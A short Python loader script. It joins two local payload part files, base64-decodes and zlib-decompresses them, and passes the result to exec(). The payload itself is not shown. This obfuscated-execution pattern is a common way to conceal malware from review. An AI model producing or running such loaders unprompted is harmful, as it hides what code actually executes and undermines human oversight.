from pathlib import Path
import base64,zlib
here=Path(__file__).resolve().parent
payload=''.join((here/f'r31_payload.part{i}').read_text(encoding='utf-8').strip() for i in range(1,3))
exec(zlib.decompress(base64.b64decode(payload)), {'__name__':'__main__'})
